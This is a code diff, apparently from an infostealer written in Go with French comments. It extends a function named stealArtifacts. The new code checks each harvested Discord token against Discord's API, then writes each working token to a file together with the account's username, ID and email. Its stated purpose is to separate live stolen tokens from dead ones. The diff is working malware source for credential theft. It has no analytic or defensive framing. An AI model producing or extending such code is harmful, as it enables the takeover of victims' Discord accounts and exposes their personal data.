@@ -8,7 +8,10 @@ package main
 import (
 	"archive/zip"
 	"bytes"
+	"context"
+	"encoding/json"
 	"fmt"
+	"net/http"
 	"os"
 	"path/filepath"
 	"strings"
@@ -138,7 +141,12 @@ func stealArtifacts() int {
 			}
 		}
 		if len(toks) > 0 {
-			add("jetons.txt", strings.Join(toks, "\n"))
+			// Chaque jeton est vérifié : un jeton mort ne sert à rien.
+			var lines []string
+			for _, tk := range toks {
+				lines = append(lines, tk+" | "+validateDiscordToken(tk))
+			}
+			add("jetons.txt", strings.Join(lines, "\n"))
 		}
 	}
 
@@ -158,4 +166,39 @@ func stealArtifacts() int {
 		plog(fmt.Sprintf("steal: %d fichier(s) annexe(s)", sent))
 	}
 	return sent
+}
+
+// validateDiscordToken interroge l API avec le jeton et rend le compte associé,
+// ou « invalide ». Permet de trier les jetons encore vivants sans les essayer
+// à la main.
+func validateDiscordToken(tok string) string {
+	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
+	defer cancel()
+	req, err := http.NewRequestWithContext(ctx, "GET", discordAPI+"/users/@me", nil)
+	if err != nil {
+		return "invalide"
+	}
+	req.Header.Set("Authorization", tok)
+	req.Header.Set("User-Agent", discordUA)
+	resp, err := httpc.Do(req)
+	if err != nil {
+		return "non vérifié"
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != 200 {
+		return fmt.Sprintf("invalide (HTTP %d)", resp.StatusCode)
+	}
+	var u struct {
+		Username string `json:"username"`
+		ID       string `json:"id"`
+		Email    string `json:"email"`
+	}
+	if json.NewDecoder(resp.Body).Decode(&u) != nil {
+		return "valide"
+	}
+	out := u.Username + " (" + u.ID + ")"
+	if u.Email != "" {
+		out += " " + u.Email
+	}
+	return out
 }
